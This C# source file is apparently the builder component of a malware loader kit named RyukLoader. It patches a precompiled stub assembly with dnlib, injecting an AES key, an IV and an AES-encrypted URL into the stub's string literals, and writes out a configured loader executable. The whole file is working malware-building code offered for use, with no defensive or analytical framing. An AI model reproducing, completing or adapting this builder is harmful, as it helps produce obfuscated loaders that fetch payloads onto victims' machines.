using dnlib.DotNet;
using dnlib.DotNet.Emit;
using System;
using System.IO;
using System.Linq;
using System.IO.Pipes;

namespace RyukLoader.Internal.Builder
{
    internal class Builder
    {
        public static string Execute(string outputFile, string url, string aesKey, string aesIv)
        {
            string stubPath = "Module\\stub.bin";

            if (!File.Exists(stubPath))
            {
                return "Stub file not found!";
            }

            try
            {
                ModuleDefMD module = ModuleDefMD.Load(stubPath);

                string className = "LoaderModule.Program";
                TypeDef classType = module.Types.FirstOrDefault(t => t.FullName == className);

                if (classType == null)
                {
                    return "Class not found!";
                }

                void UpdateStringLiteral(string oldValue, string newValue)
                {
                    foreach (var method in classType.Methods)
                    {
                        if (!method.HasBody) continue;

                        foreach (var instr in method.Body.Instructions)
                        {
                            if (instr.OpCode == OpCodes.Ldstr && (string)instr.Operand == oldValue)
                            {
                                instr.Operand = newValue;
                            }
                        }
                    }
                }

                UpdateStringLiteral("%AES_KEY%", aesKey);
                UpdateStringLiteral("%AES_IV%", aesIv);
                UpdateStringLiteral("%ENCRYPTED_STRING%", EncryptEngine.EncryptEngine.EncryptStringToBase64(url, aesKey, aesIv));


                module.Write(outputFile);

                return "Success!";
            }
            catch (FileNotFoundException ex)
            {
                return $"File not found: {ex.Message}";
            }
            catch (IOException ex)
            {
                return $"I/O Error: {ex.Message}";
            }
            catch (UnauthorizedAccessException ex)
            {
                return $"Access denied: {ex.Message}";
            }
            catch (Exception ex)
            {
                return $"An unexpected error occurred: {ex.Message}";
            }
        }

    }
}
